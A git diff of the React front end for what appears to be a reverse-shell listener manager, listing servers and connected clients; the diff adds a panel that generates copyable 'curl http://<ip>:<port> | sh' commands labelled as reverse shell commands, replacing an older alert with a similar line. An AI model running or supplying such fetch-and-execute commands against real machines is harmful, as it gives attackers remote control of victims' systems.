@@ -1,22 +1,32 @@
+import React from "react";
 import {
   notification,
   message,
   InputNumber,
   Table,
   Tag,
+  Divider,
   Button,
   Tooltip,
+  Badge,
   Layout,
   Menu,
+  Input,
   Alert,
+  Tabs,
+  Descriptions,
+  Collapse,
 } from "antd";
-import React from "react";
-import "./App.less";
-import qs from "qs";
 
+import "./App.css";
+import qs from "qs";
+import { CopyToClipboard } from "react-copy-to-clipboard";
+const { Panel } = Collapse;
+const { Search } = Input;
 const axios = require("axios");
 axios.defaults.headers.post["Content-Type"] =
   "application/x-www-form-urlencoded";
+const { TabPane } = Tabs;
 
 const moment = require("moment");
 var W3CWebSocket = require("websocket").w3cwebsocket;
@@ -29,7 +39,8 @@ message.config({
 
 const { Header, Content, Sider } = Layout;
 
-let baseUrl = ["http://", window.location.host].join("");
+// let baseUrl = ["http://", window.location.host].join("");
+let baseUrl = ["http://", "127.0.0.1:7331"].join("");
 let apiUrl = [baseUrl, "/api"].join("");
 let wsUrl = ["ws://", window.location.host, "/notify"].join("");
 
@@ -130,54 +141,53 @@ class App extends React.Component {
       clients: [],
       endPointAlive: true,
       serverPort: 0,
+      currentServer: null,
     };
   }
 
-  componentDidMount() {
-    this.setState({
-      fetchData: () => {
-      axios
-        .get([apiUrl, "/server"].join(""))
-        .then((response) => {
-          console.log(response);
-          let servers = [];
+  fetchData() {
+    axios
+      .get([apiUrl, "/server"].join(""))
+      .then((response) => {
+        let servers = [];
 
-          this.setState({ serversResponse: response.data.msg });
+        this.setState({ serversResponse: response.data.msg });
 
-          for (let [k, v] of Object.entries(response.data.msg)) {
-            v.hash = k;
-            v.key = k;
-            servers.push(v);
-          }
+        for (let [k, v] of Object.entries(response.data.msg)) {
+          v.hash = k;
+          v.key = k;
+          servers.push(v);
+        }
 
-          if (servers.length > 0) {
-            this.setState({
-              clients: generateClientsArray(servers[0].clients),
-            });
-          }
+        if (servers.length > 0) {
+          this.setState({ currentServer: servers[0] });
 
-          this.setState({ servers: servers });
-        })
-        .then(() => {
-          if (this.state.clients.length > 0) {
-            axios
-              .get(
-                  apiUrl + "/server/" + this.state.servers[0].hash + "/client"
-              )
-              .then((response) => {
-                this.setState({
-                  clients: generateClientsArray(response.data.msg),
-                });
+          this.setState({
+            clients: generateClientsArray(servers[0].clients),
+          });
+        }
+
+        this.setState({ servers: servers });
+      })
+      .then(() => {
+        if (this.state.clients.length > 0) {
+          axios
+            .get(apiUrl + "/server/" + this.state.servers[0].hash + "/client")
+            .then((response) => {
+              this.setState({
+                clients: generateClientsArray(response.data.msg),
               });
-          }
-        })
-        .catch((error) => {
-          this.setState({ endPointAlive: false });
-          message.error("Cannot connect to API EndPoint: " + error, 5);
-        });
-    }});
+            });
+        }
+      })
+      .catch((error) => {
+        this.setState({ endPointAlive: false });
+        message.error("Cannot connect to API EndPoint: " + error, 5);
+      });
+  }
 
-    this.state.fetchData();
+  componentDidMount() {
+    this.fetchData();
 
     var client = new W3CWebSocket(wsUrl);
     client.onerror = () => {
@@ -198,10 +208,11 @@ class App extends React.Component {
             "New client connected from: " +
               onlinedClient.host +
               ":" +
-              onlinedClient.port, 5
+              onlinedClient.port,
+            5
           );
           // Update data
-          this.state.fetchData();
+          this.fetchData();
           break;
         case CLIENT_DUPLICATED:
           let duplicatedClient = data.Data.Client;
@@ -209,8 +220,9 @@ class App extends React.Component {
             "Duplicated client connected from: " +
               duplicatedClient.host +
               ":" +
-              duplicatedClient.port + 
-              ", connection reseted.", 5
+              duplicatedClient.port +
+              ", connection reseted.",
+            5
           );
           break;
         default:
@@ -228,6 +240,64 @@ class App extends React.Component {
   }
 
   render() {
+    let hint;
+    if (this.state.currentServer == null) {
+      hint = (
+        <Alert
+          message="Warning"
+          description="Please start and select a server"
+          type="warning"
+          showIcon
+          closable
+        />
+      );
+    } else {
+      hint = (
+        <div>
+          <Divider orientation="left"></Divider>
+          <Descriptions title="Server Info">
+            <Descriptions.Item label="Address">
+              {this.state.currentServer.host +
+                ":" +
+                this.state.currentServer.port}
+            </Descriptions.Item>
+            <Descriptions.Item label="Clients">
+              {this.state.currentServer?Object.keys(this.state.currentServer.clients).length:0}
+            </Descriptions.Item>
+            <Descriptions.Item label="Started">
+              {moment(this.state.timestamp).fromNow()}
+            </Descriptions.Item>
+          </Descriptions>
+          <Collapse>
+            <Panel header="Expand to show the server info and the reverse shell commands for the current server">
+              <Tabs defaultActiveKey="1">
+                {this.state.currentServer.interfaces.map((value, index) => {
+                  let command = [
+                    "curl http://",
+                    value,
+                    ":",
+                    this.state.currentServer.port,
+                    " | sh",
+                  ].join("");
+                  return (
+                    <TabPane tab={value} key={index}>
+                      <Tag>{command}</Tag>
+                      <CopyToClipboard
+                        text={command}
+                        onCopy={() => this.setState({ copied: true })}
+                      >
+                        <button>Click to copy</button>
+                      </CopyToClipboard>
+                    </TabPane>
+                  );
+                })}
+              </Tabs>
+            </Panel>
+          </Collapse>
+        </div>
+      );
+    }
+
     return (
       <Layout>
         <Header className="header">
@@ -266,25 +336,27 @@ class App extends React.Component {
                       })
                     )
                     .then((response) => {
-                      console.log(response)
+                      console.log(response);
                       if (response.data.status) {
                         message.success(
-                          "Server created at: " + 
-                          response.data.msg.host +
-                          ":" + 
-                          response.data.msg.port, 5
+                          "Server created at: " +
+                            response.data.msg.host +
+                            ":" +
+                            response.data.msg.port,
+                          5
                         );
-                        this.state.fetchData();
+                        this.fetchData();
                       } else {
                         message.error(
-                          "Server create failed: " + 
-                          response.data.msg, 5
+                          "Server create failed: " + response.data.msg,
+                          5
                         );
                       }
                     })
                     .catch((error) => {
                       message.error(
-                        "Cannot connect to API EndPoint!" + error, 5
+                        "Cannot connect to API EndPoint!" + error,
+                        5
                       );
                     });
                 }}
@@ -293,37 +365,40 @@ class App extends React.Component {
               </Button>
               {this.state.servers.map((value, index) => {
                 return (
+                  <>
                   <Menu.Item
                     key={value.hash}
                     onClick={(item, key, keyPath, domEvent) => {
-                      axios
-                        .get(apiUrl, "/server/" + item.key + "/client")
-                        .then((response) => {
-                          this.setState({
-                            clients: generateClientsArray(response.data.msg),
-                          });
-                        });
+                      this.setState({
+                        currentServer: this.state.serversResponse[item.key],
+                      });
                     }}
                   >
-                    {value.port}
-                  </Menu.Item>
+                  {value.host + ":" + value.port}
+                  <Badge count={Object.keys(value.clients).length} overflowCount={99} offset={[10, 0]}></Badge>
+                </Menu.Item>
+                
+                </>
                 );
               })}
             </Menu>
           </Sider>
           <Layout style={{ padding: "0 24px 24px" }}>
             <Content style={{ margin: "0 0" }}>
-              <Alert
-                message="Warning"
-                description="You can use `curl http://8.8.8.8:13337 | sh` to popup a reverse shell."
-                type="warning"
-                showIcon
-                closable
-              />
+              {hint}
               <Table
                 columns={columns}
                 pagination={{ position: [this.state.bottom] }}
-                dataSource={this.state.clients}
+                // dataSource={() => {
+                //   return []
+                //   if (!this.state.currentServer) {
+                //     return []
+                //   } else {
+                //     return generateClientsArray(this.state.currentServer.clients)
+                //   }
+                  
+                // }}
+                dataSource={generateClientsArray(this.state.currentServer?this.state.currentServer.clients:[])}
               />
             </Content>
           </Layout>
